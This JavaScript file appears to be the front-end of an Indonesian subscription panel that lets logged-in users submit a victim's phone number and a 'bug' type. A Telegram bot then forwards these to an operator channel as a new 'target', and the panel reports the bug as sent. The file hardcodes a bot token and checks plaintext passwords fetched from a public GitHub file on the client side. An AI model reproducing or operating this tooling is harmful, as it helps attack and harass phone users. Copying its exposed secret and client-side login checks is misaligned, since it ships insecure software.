const loginForm = document.getElementById('login-form');
const loginButton = document.getElementById('login-button');
const registerLink = document.getElementById('register-link');
const loginMessage = document.getElementById('login-message');

const loadingContainer = document.querySelector('.loading-container');
const mainContent = document.querySelector('.main-content');

const nomorInput = document.getElementById('nomor');
const jenisSelect = document.getElementById('jenis');
const kirimButton = document.getElementById('kirim-button');
const kirimMessage = document.getElementById('kirim-message');

const expiryDateElement = document.getElementById('expiry-date');

let expiryDate;
let isExpired = false; // Tambahkan variabel untuk menandai status kadaluarsa

// Fungsi untuk mengambil data dari db.json (simulasi database)
async function getData() {
    try {
        const response = await fetch('https://raw.githubusercontent.com/hardycok/Login-app/main/db.json');
        const data = await response.json();
        return data;
    } catch (error) {
        console.error('Error fetching data:', error);
        showMessage(loginMessage, 'Error: Data pengguna tidak ditemukan.');
        return null;
    }
}

// Fungsi untuk menampilkan pesan
function showMessage(element, message, isSuccess = false) {
    element.textContent = message;
    element.style.color = isSuccess ? 'green' : '#f44336';
}

// Fungsi untuk validasi login
async function validateLogin(username, password) {
    const data = await getData();
    if (!data || !data.users) {
        showMessage(loginMessage, 'Error: Data pengguna tidak ditemukan.');
        return false;
    }

    const user = data.users.find(u => u.username === username && u.password === password);
    if (user) {
        showMessage(loginMessage, 'Akun valid✅', true);
        expiryDate = new Date(user.expiryDate);
        return true;
    } else {
        showMessage(loginMessage, 'Username atau password tidak valid❌');
        return false;
    }
}

// Fungsi untuk menampilkan loading
function showLoading() {
    document.querySelector('.login-container').style.display = 'none';
    loadingContainer.style.display = 'flex';

    const videoDuration = 12000; // Durasi video 12 detik (dalam milidetik)

    setTimeout(() => {
        loadingContainer.style.display = 'none';
        mainContent.style.display = 'block';
        showMainContent();
    }, videoDuration);
}

// Fungsi untuk menampilkan konten utama
function showMainContent() {
    const now = new Date();

    if (expiryDate <= now) {
        expiryDateElement.textContent = 'Anda telah kadaluarsa, segera hubungi admin👻';
        expiryDateElement.style.fontSize = '16px';
        expiryDateElement.style.color = '#fff'; // Warna putih
        isExpired = true; // Set status kadaluarsa
    } else {
        const formattedDate = expiryDate.toLocaleDateString('id-ID', {
            year: 'numeric',
            month: '2-digit',
            day: '2-digit'
        });
        expiryDateElement.textContent = formattedDate;
        isExpired = false; // Set status tidak kadaluarsa
    }
}

// Event listener untuk tombol login
loginButton.addEventListener('click', async () => {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    if (await validateLogin(username, password)) {
        showLoading();
    }
});

// Event listener untuk tautan daftar (simulasi)
registerLink.addEventListener('click', (e) => {
    e.preventDefault(); // Mencegah tautan mengarah ke halaman lain
    alert('Fitur pendaftaran belum tersedia. Silakan hubungi administrator.');
});

// Event listener untuk tombol kirim
kirimButton.addEventListener('click', async () => {
    if (isExpired) {
        showMessage(kirimMessage, 'akun kadaluarsa ❌');
        return; // Hentikan pengiriman ke Telegram
    }

    const nomor = nomorInput.value;

    // Validasi nomor
    if (nomor === null || nomor.trim() === '' || nomor.trim() === '+') {
        showMessage(kirimMessage, 'harap masukkan nomor ❌');
        return; // Hentikan pengiriman jika nomor tidak valid
    }

    const jenis = jenisSelect.value;

    const botToken = '8227413542:AAGmgTkMW7MeGMpX6YtpTcyFCqJ1kh3kdKY'; // Ganti dengan token bot Anda
    const channelId = '-1003466939362'; // Ganti dengan ID channel Anda
    const message = `Target masuk nih👻🗿\nNomor: ${nomor}\njenis: ${jenis}`;

    try {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${channelId}&text=${encodeURIComponent(message)}`);
        const data = await response.json();

        if (data.ok) {
            showMessage(kirimMessage, 'Success mengirim bug ke target✅', true);
        } else {
            showMessage(kirimMessage, 'Gagal mengirim pesan ke Telegram.');
        }
    } catch (error) {
        console.error('Error mengirim pesan ke Telegram:', error);
        showMessage(kirimMessage, 'Gagal mengirim pesan ke Telegram.');
    }
});
